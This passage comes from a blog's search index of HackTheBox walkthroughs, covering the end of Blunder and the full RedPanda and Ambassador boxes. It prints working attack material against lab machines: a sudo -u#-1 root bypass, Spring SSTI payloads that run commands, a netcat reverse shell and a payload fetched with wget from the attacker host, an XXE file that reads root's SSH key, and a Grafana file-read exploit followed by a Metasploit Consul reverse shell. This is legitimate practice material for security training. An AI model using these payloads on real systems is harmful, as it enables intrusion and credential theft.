&quot;&quot;, &quot;instagram&quot;: &quot;&quot;, &quot;github&quot;: &quot;&quot;, &quot;gitlab&quot;: &quot;&quot;, &quot;linkedin&quot;: &quot;&quot;, &quot;mastodon&quot;: &quot;&quot; } } Unable to crack the hashes There is another version of bludit in the /var/www directory, lets view users.php there www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php &amp;lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&amp;gt; { &quot;admin&quot;: { &quot;nickname&quot;: &quot;Hugo&quot;, &quot;firstName&quot;: &quot;Hugo&quot;, &quot;lastName&quot;: &quot;&quot;, &quot;role&quot;: &quot;User&quot;, &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;, &quot;email&quot;: &quot;&quot;, &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;, &quot;tokenRemember&quot;: &quot;&quot;, &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;, &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;, &quot;twitter&quot;: &quot;&quot;, &quot;facebook&quot;: &quot;&quot;, &quot;instagram&quot;: &quot;&quot;, &quot;codepen&quot;: &quot;&quot;, &quot;linkedin&quot;: &quot;&quot;, &quot;github&quot;: &quot;&quot;, &quot;gitlab&quot;: &quot;&quot;} } Identify the hash ┌──(root💀kali)-[~/htb/blunder/10.10.10.191/exploit] └─# nth -t &#39;faca404fd5c0a31cf1897b823c695c85cffeb98d&#39; faca404fd5c0a31cf1897b823c695c85cffeb98d Most Likely SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums. HMAC-SHA1 (key = $salt), HC: 160 JtR: hmac-sha1 Double SHA-1, HC: 4500 RIPEMD-160, HC: 6000 JtR: ripemd-160 Least Likely Haval-160 (3 rounds), HC: 6000 JtR: dynamic_190 Haval-160 (4 rounds), HC: 6000 JtR: dynamic_200 Haval-160 (5 rounds), HC: 6000 JtR: dynamic_210 Haval-192 (3 rounds), HC: 6000 JtR: dynamic_220 Haval-192 (4 rounds), HC: 6000 JtR: dynamic_230 Haval-192 (5 rounds), HC: 6000 JtR: dynamic_240 Haval-224 (4 rounds), HC: 6000 JtR: dynamic_260 Haval-224 (5 rounds), HC: 6000 JtR: dynamic_270 Haval-160, Tiger-160, HAS-160, LinkedIn, HC: 190 JtR: raw-sha1-linkedin Skein-256(160), Skein-512(160), MangosWeb Enhanced CMS, sha1(sha1(sha1($pass))), HC: 4600 sha1(md5($pass)), HC: 4700 sha1($pass.$salt), HC: 110 sha1($salt.$pass), HC: 120 sha1(unicode($pass).$salt), HC: 130 sha1($salt.unicode($pass)), HC: 140 HMAC-SHA1 (key = $pass), HC: 150 JtR: hmac-sha1 sha1($salt.$pass.$salt), HC: 4710 Cisco Type 7, BigCrypt, JtR: bigcrypt PKZIP Master Key, HC: 20500 SHA-1, HC:100 Crackstation hugo:Password120 Switch to user hugo w/ Password120Root - Sudo 1.8.27 Security Bypass Check user hugo’s sudo access hugo@blunder:/var/www/bludit-3.9.2/bl-content/databases$ sudo -l Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User hugo may run the following commands on blunder: (ALL, !root) /bin/bash (ALL, !root) /bin/bash I’ve seen this way to root machines multiple times, there is a vulnerability in sudo 1.8.27, where sudo doesn’t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root’s id Rooted! hugo@blunder:/var/www/bludit-3.9.2/bl-content/databases$ sudo -u#-1 /bin/bash root@blunder:/var/www/bludit-3.9.2/bl-content/databases# id;whoami uid=0(root) gid=1001(hugo) groups=1001(hugo) root root@blunder:/var/www/bludit-3.9.2/bl-content/databases# " }, { "title": "HackTheBox - RedPanda", "url": "/posts/RedPanda/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/ssti", "date": "2022-11-05 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering /search, where it is susceptible to a SSTI2RCE exploit due to insufficient input sanitization, allowing us to obtain a low-privilege/www-data shell.For the privilege escalation part, pspy is used to snoop on background processes, discovering a JAR file being executed every 2 minutes by root. The purpose of the JAR file is to update author’s view count periodically. After analyzing the JAR file w/ jd-gui, it is vulnerable to a XXE and directory traversal exploit due to insufficient user input sanitization, allowing us to privilege escalate to root. Column Details Box Name RedPanda IP 10.10.11.170 Points 30 Difficulty Easy Creator Woodenk Release Date 09 Jul 2022 ReconTCP/80 (HTTP) FFUF 405 GET 1l 3w 0c http://10.10.11.170:8080/search 200 GET 275l 763w 7549c http://10.10.11.170:8080/css/panda.css 200 GET 22l 41w 295c http://10.10.11.170:8080/css/main.css 200 GET 55l 119w 0c http://10.10.11.170:8080/ 500 GET 1l 1w 0c http://10.10.11.170:8080/error 200 GET 32l 97w 0c http://10.10.11.170:8080/stats 200 GET 54l 102w 822c http://10.10.11.170:8080/css/stats.css An interesting directory is enumerated, /search Initial FootholdTCP/80 (HTTP) - /search, SSTI2RCE Found a page that allows users to search for names of red panda After some testing, I can conclude that Some special characters are banned # Payload $ } { {, } results in a 500 Internal Server Error, this could be SSTI. Not vulnerable to SQLi/NoSQL SQLMap could not find any vulnerabilities Not vulnerable to Command Injection No code execution Not vulnerable to LFI/RFI No content of files returned Vulnerable to SSTI # Payload *{23*3} #{23*3} Mathematic equation is computed and reflected. Searching for payload Since $ is banned, we have to look for payloads that does not contain $.After browsing through the payloads, found one w/o $ SSTI RCE check # Payload *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;id&#39;).getInputStream())} RCE achieved ! Create reverse shell payload #!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.6 4444 &amp;gt;/tmp/f Host payload Download reverse shell payload onto redpanda.htb # Payload *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;wget -O /tmp/exploit.sh http://10.10.14.6/exploit.sh&#39;).getInputStream())} Invoke a reverse shell # Payload *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;sh /tmp/exploit.sh&#39;).getInputStream())} woodenk shell obtained ┌──(root💀kali)-[~/htb/redpanda] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.170. Ncat: Connection from 10.10.11.170:43658. /bin/sh: 0: can&#39;t access tty; job control turned off $ id;whoami uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) woodenk Demo - SSTI2RCEPrivilege EscalationRoot - Enumeration (Jar File executed as root) Snoop background processes w/ pspy64 2022/11/05 07:36:01 CMD: UID=0 PID=27149 | /usr/sbin/CRON -f 2022/11/05 07:36:01 CMD: UID=0 PID=27150 | /bin/sh -c /root/run_credits.sh 2022/11/05 07:36:01 CMD: UID=0 PID=27151 | /bin/sh /root/run_credits.sh 2022/11/05 07:36:01 CMD: UID=0 PID=27152 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 2022/11/05 07:38:01 CMD: UID=0 PID=27169 | /usr/sbin/CRON -f 2022/11/05 07:38:01 CMD: UID=0 PID=27171 | /bin/sh /root/run_credits.sh 2022/11/05 07:38:01 CMD: UID=0 PID=27170 | /bin/sh -c /root/run_credits.sh 2022/11/05 07:38:01 CMD: UID=0 PID=27172 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar - is executed by root every 2 minutes. Transfer it to kali for analysisRoot - What is the JAR file doing? Lets analyze file.jar w/ jd-gui public class App { public static Map parseLog(String line) { String[] strings = line.split(&quot;\\\\|\\\\|&quot;); Map&amp;lt;Object, Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); map.put(&quot;status_code&quot;, Integer.valueOf(Integer.parseInt(strings[0]))); map.put(&quot;ip&quot;, strings[1]); map.put(&quot;user_agent&quot;, strings[2]); map.put(&quot;uri&quot;, strings[3]); return map; } public static boolean isImage(String filename) { if (filename.contains(&quot;.jpg&quot;)) return true; return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for (Directory dir : metadata.getDirectories()) { for (Tag tag : dir.getTags()) { if (tag.getTagName() == &quot;Artist&quot;) return tag.getDescription(); } } return &quot;N/A&quot;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for (Element el : rootElement.getChildren()) { if (el.getName() == &quot;image&quot;) if (el.getChild(&quot;uri&quot;).getText().equals(uri)) { Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild(&quot;totalviews&quot;).getText()) + 1); System.out.println(&quot;Total views:&quot; + Integer.toString(totalviews.intValue())); rootElement.getChild(&quot;totalviews&quot;).setText(Integer.toString(totalviews.intValue())); Integer views = Integer.valueOf(Integer.parseInt(el.getChild(&quot;views&quot;).getText())); el.getChild(&quot;views&quot;).setText(Integer.toString(views.intValue() + 1)); } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(&quot;/opt/panda_search/redpanda.log&quot;); Scanner log_reader = new Scanner(log_fd); while (log_reader.hasNextLine()) { String line = log_reader.nextLine(); if (!isImage(line)) continue; Map parsed_data = parseLog(line); System.out.println(parsed_data.get(&quot;uri&quot;)); String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString()); System.out.println(&quot;Artist: &quot; + artist); String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;; addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString()); } } } When executed, reads redpanda.log line by line. Checks if line contains string .jpg Splits the line into parts w/ || as a delimiter [0]: Status Code [1]: Ip Address [2]: User Agent [3]: URI (Name of image file) Get artist name using metadata (Artist:) of image file Create xml path /credits/ + artist + _creds.xml Process xml file and update it by writing it. How do we exploit the JAR file (XXE Involved) We have write access to redpanda.log Able to write directly to redpanda.log OR write it through the web Since XML file is being processed, we are able to do XXE. However there are a few problems we have to overcome to do XXE. Path of image file is hardcoded, /opt/panda_search/src/main/resources/static/img/&amp;lt;image name&amp;gt; (1) We do not have write access to the XML file. (2) The path to the XML file is hardcoded, /credits/ + artist + _creds.xml (3) We can easily overcome problem (1) by using directory traversal ../ to point to our malicious JPG file (Remember that image name is obtained from redpanda.log) redpanda.log must be in this format, &amp;lt;any number&amp;gt;||&amp;lt;any number&amp;gt;||&amp;lt;any word&amp;gt;||&amp;lt;../../../../../exploit.jpg&amp;gt;, because of line.split(&quot;\\\\|\\\\|&quot;); The hardcoded directory (/opt/panda_search/src/main/resources/static/img/) will be removed w/ multiple ../, allowing us to point to our malicious image file. We can easily overcome problem (2) by creating our own malicious XML file (exploit.xml) We can easily overcome problem (3) by using directory traversal ../ to point to our malicious XML file. We can do directory traversal by adding a metadata Artist to our image file (exploit.jpg) w/ value ../../../../exploit This is done using exiftool. This will result in /credits/../../../../../exploit_creds.xml Exploiting JAR file (XXE Involved) Create malicious image file w/ artist metadata # Use any random image ┌──(root💀kali)-[~/htb/redpanda/10.10.11.170/loot] └─# exiftool -Artist=&quot;../../../../../../../tmp/exploit&quot; exploit.jpg Verify metadata (Artist) exists ┌──(root💀kali)-[~/htb/redpanda/10.10.11.170/loot] └─# exiftool exploit.jpg | grep Artist Artist : ../../../../../../../tmp/exploit Create malicious XML file (exploit_creds.xml) &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &quot;file:///root/.ssh/id_rsa&quot; &amp;gt;]&amp;gt; &amp;lt;credits&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; &amp;lt;/credits&amp;gt; Create malicious redpanda.log 123||a||a||/../../../../../../tmp/exploit.jpg Transfer files to redpanda.htb wget 10.10.14.6/exploit_creds.xml wget 10.10.14.6/exploit.jpg wget 10.10.14.6/redpanda.log -O /opt/panda_search/redpanda.log Wait for cronjob to execute, allowing us to obtain root’s private key woodenk@redpanda:/tmp$ cat exploit_creds.xml &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo&amp;gt; &amp;lt;credits&amp;gt; &amp;lt;foo&amp;gt;-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29 ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE= -----END OPENSSH PRIVATE KEY-----&amp;lt;/foo&amp;gt; &amp;lt;/credits&amp;gt; Demo - Exploiting JAR file " }, { "title": "HackTheBox - Ambassador", "url": "/posts/Ambassador/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "pivot", "date": "2022-10-23 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering that TCP/3000 is running grafana, where it is susceptible to a directory traversal &amp;amp; arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file grafana.ini &amp;amp; grafana.db allowing us to extract mysql user credentials. Accessing SQL reveals SSH credentials.After enumerating the system, .git-config is discovered on developer home directory, .git-config reveals /opt/my-app where .git exists, allowing us to view all the commits made, revealing credentials for consul service. consul service is vulnerable to a RCE exploit, whereby attackers can craft a malicious json service configuration file to do code execution, privilege escalating us to root. Column Details Box Name Ambassador IP 10.10.11.183 Points 30 Difficulty Medium Creator DirectRoot Release Date 01 Oct 2022 ReconTCP/80 (HTTP) FFUF 403 GET 9l 28w 277c http://10.10.11.183/.html 200 GET 92l 143w 1793c http://10.10.11.183/404.html 301 GET 9l 28w 317c http://10.10.11.183/categories =&amp;gt; http://10.10.11.183/categories/ 301 GET 9l 28w 313c http://10.10.11.183/images =&amp;gt; http://10.10.11.183/images/ 200 GET 155l 305w 3654c http://10.10.11.183/index.html 301 GET 9l 28w 312c http://10.10.11.183/posts =&amp;gt; http://10.10.11.183/posts/ 200 GET 18l 22w 645c http://10.10.11.183/sitemap.xml 301 GET 9l 28w 311c http://10.10.11.183/tags =&amp;gt; http://10.10.11.183/tags/ Nothing really interesting. Initial FootholdTCP/80 (HTTP) Found a post, revealing a username developer TCP/22 (SSH) - Bruteforce Developer User (Failed) Tried to bruteforce failed.TCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) Found a login page @ http://ambassador.htb:3000/login Grafana - is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources. Search exploits for Grafana Exploit Title Path Grafana 7.0.1 - Denial of Service (PoC) linux/dos/48638.sh Grafana 8.3.0 - Directory Traversal and Arbitrary File Read multiple/webapps/50581.py How does Grafana 8.3.0 - Directory Traversal and Arbitrary File Read work? Grafana is vulnerable to a directory traversal vulnerability due to a lack of path normalization in the /public/plugins// URL. Allowing unauthenticated attackers to read sensitive files on the server. Try Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - multiple/webapps/50581.py ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# python3 50581.py -H http://10.10.11.183:3000 Read file &amp;gt; /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin developer:x:1000:1000:developer:/home/developer:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false grafana:x:113:118::/usr/share/grafana:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false consul:x:997:997::/home/consul:/bin/false It works! Demo - Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - multiple/webapps/50581.py TCP/3306 (MySQL) - Access MySQL Access mysql w/ grafana:dontStandSoCloseToMe63221! ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# mysql -u grafana -p -h ambassador.htb Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 175 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MySQL [(none)]&amp;gt; Exfiltrate SSH credentials ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# mysql -u grafana -p -h ambassador.htb Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 177 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MySQL [(none)]&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0.247 sec) MySQL [(none)]&amp;gt; use whackywidget; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]&amp;gt; show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0.247 sec) MySQL [whackywidget]&amp;gt; SELECT * FROM users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0.247 sec) MySQL [whackywidget]&amp;gt; Decrypt Base64 encoded password ┌──(root💀kali)-[~/htb/ambassador] └─# echo &quot;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&quot; | base64 -d anEnglishManInNewYork027468 Valid Creds developer:anEnglishManInNewYork027468 TCP/22 (SSH) - Successfully SSH SSH w/ developer:anEnglishManInNewYork027468 ┌──(root💀kali)-[~/htb/ambassador] └─# sshpass -p &quot;anEnglishManInNewYork027468&quot; ssh developer@ambassador.htb Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 22 Oct 2022 06:44:00 AM UTC System load: 0.0 Usage of /: 84.6% of 5.07GB Memory usage: 55% Swap usage: 0% Processes: 232 Users logged in: 0 IPv4 address for eth0: 10.10.11.183 IPv6 address for eth0: dead:beef::250:56ff:feb9:32a4 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Oct 22 01:09:02 2022 from 10.10.14.149 developer@ambassador:~$ cat user.txt db92bc3f23be59a6a4f23743178c8ea4 Privilege EscalationRoot - Enumeration (.git Repo) Found .gitconfig file, revealing two interesting folders developer@ambassador:~$ cat .gitconfig [user] name = Developer email = developer@ambassador.local [safe] directory = /opt/my-app /opt/my-app Found .git directory, we can potentially find sensitive information from git logs developer@ambassador:/opt/my-app$ ls -la total 24 drwxrwxr-x 5 root root 4096 Mar 13 2022 . drwxr-xr-x 4 root root 4096 Sep 1 22:13 .. drwxrwxr-x 4 root root 4096 Mar 13 2022 env drwxrwxr-x 8 root root 4096 Mar 14 2022 .git -rw-rw-r-- 1 root root 1838 Mar 13 2022 .gitignore drwxrwxr-x 3 root root 4096 Mar 13 2022 whackywidget View git branches developer@ambassador:/opt/my-app$ git branch * main Git branches are effectively a pointer to a snapshot of your changes. When you want to add a new feature or fix a bug Spawn a new branch to encapsulate your changes. This makes it harder for unstable code to get merged into the main code base, and it gives you the chance to clean up your future’s history before merging it into the main branch. - Source View logs for main branch developer@ambassador:/opt/my-app$ git log main commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&amp;gt; main) Author: Developer &amp;lt;developer@ambassador.local&amp;gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer &amp;lt;developer@ambassador.local&amp;gt; Date: Sun Mar 13 23:44:45 2022 +0000 config script commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 Author: Developer &amp;lt;developer@ambassador.local&amp;gt; Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLI commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51 Author: Developer &amp;lt;developer@ambassador.local&amp;gt; Date: Sun Mar 13 22:44:11 2022 +0000 .gitignore Git logs displays all the commits being made in that repository in multiple lines along with the commit id, author name, date and commit message. There are 2 interesting commits, 33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI View 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI developer@ambassador:/opt/my-app$ git show 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 ...SNIP... +# SECURITY WARNING: keep the secret key used in production secret! +SECRET_KEY = &#39;django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l&#39; ...SNIP... This is likely a rabbit-hole, because django-admin does not exist on ambassador.htb &amp;amp; TCP/8000 (django Default Port) is not up. View 33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&amp;gt; main) Author: Developer &amp;lt;developer@ambassador.local&amp;gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh index 35c08f6..fc51ec0 100755 --- a/whackywidget/put-config-in-consul.sh +++ b/whackywidget/put-config-in-consul.sh @@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app -# Export MYSQL_PASSWORD before running +# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 - token is revealed, this allows us to access the service. Check if consul is actually on the ambassador.htb developer@ambassador:/opt/my-app$ consul Usage: consul [--version] [--help] &amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;] developer@ambassador:/opt/my-app$ netstat -a Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:domain 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN tcp 0 0 localhost:8600 0.0.0.0:* LISTEN tcp 0 0 localhost:33060 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:mysql 0.0.0.0:* LISTEN tcp 0 0 localhost:8300 0.0.0.0:* LISTEN tcp 0 0 localhost:8301 0.0.0.0:* LISTEN tcp 0 0 localhost:8302 0.0.0.0:* LISTEN tcp 0 0 localhost:8500 0.0.0.0:* LISTEN It exists ! Search exploits for consul Exploit Title Path Hashicorp Consul - Remote Command Execution via Rexec (Metasploit) linux/remote/46073.rb Hashicorp Consul - Remote Command Execution via Services API (Metasploit) linux/remote/46074.rb How does Hashicorp Consul - Remote Command Execution via Rexec work? consul API is susceptible to a RCE exploit, attackers can construct a malicious json service config file for consul to do remote code execution. More Info Hasicorp Wallarm Port Forwarding w/ SSH Tunnel We have to be able to access consul on kali in order to use the metasploit exploit, we can do so w/ SSH Tunnel Port Forwarding w/ SSH tunnel ┌──(root💀kali)-[~/htb/ambassador] └─# sshpass -p &quot;anEnglishManInNewYork027468&quot; ssh -L8500:127.0.0.1:8500 developer@ambassador.htb On kali port 8500 is forwarded to ambassador.htb on port 8500 Now we can access consul on kali ┌──(root💀kali)-[~/htb/ambassador] └─# curl localhost:8500/v1/test Invalid URL path: not a recognized HTTP API endpoint Root - Consul RCE (Metasploit) Launch metasploit Use for multi/misc/consul_service_exec Set OPTIONS msf6 exploit(multi/misc/consul_service_exec) &amp;gt; set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5 ACL_TOKEN =&amp;gt; bb03b43b-1d81-d62b-24b5-39540ee469b5 msf6 exploit(multi/misc/consul_service_exec) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.104 msf6 exploit(multi/misc/consul_service_exec) &amp;gt; set RHOSTS 127.0.0.1 RHOSTS =&amp;gt; 127.0.0.1 msf6 exploit(multi/misc/consul_service_exec) &amp;gt; set payload linux/x86/meterpreter/reverse_tcp payload =&amp;gt; linux/x86/meterpreter/reverse_tcp Exploit ! msf6 exploit(multi/misc/consul_service_exec) &amp;gt; exploit [*] Started reverse TCP handler on 10.10.14.104:4444 [*] Creating service &#39;twNlWsVX&#39; [*] Service &#39;twNlWsVX&#39; successfully created. [*] Waiting for service &#39;twNlWsVX&#39; script to trigger [*] Sending stage (989032 bytes) to 10.10.11.183 [*] Meterpreter session 1 opened (10.10.14.104:4444 -&amp;gt; 10.10.11.183:50154 ) at 2022-10-23 14:53:10 +0800 [*] Removing service &#39;twNlWsVX&#39; [*] Command Stager progress - 100.00% done (763/763 bytes) meterpreter &amp;gt; shell Process 2932 created. Channel 1 created. id uid=0(root) gid=0(root) groups=0(root) AdditionalTCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) (Manual) Following this blogpost, we are able to leverage this vulnerability to obtain a user on the system. This github repository as well Where login credentials are stored in Grafana Configuration File (/etc/grafana/grafana.ini) Which part of the configuration file holds the credentials Database Configuration File (/var/lib/grafana/grafana.db) Read /etc/grafana/grafana.ini ...SNIP... ############################## Security #################################### [security] # disable creation of admin user on first start of grafana ;disable_initial_admin_creation = false # default admin user, created on startup ;admin_user = admin # default admin password, can be changed before first start of grafana, or in profile settings admin_password = messageInABottle685427 # used for signing ;secret_key = SW2YcwTIb9zpOOhoPsMm ...SNIP... ; - is a comment, meaning configuration is not active admin:messageInABottle685427 SW2YcwTIb9zpOOhoPsMm Tried to bruteforce SSH, failed ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# cat usernames.txt root grafana developer ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# cat passwords.txt messageInABottle685427 ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# hydra -L usernames.txt -P passwords.txt ssh://ambassador.htb -e nsr -I Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra 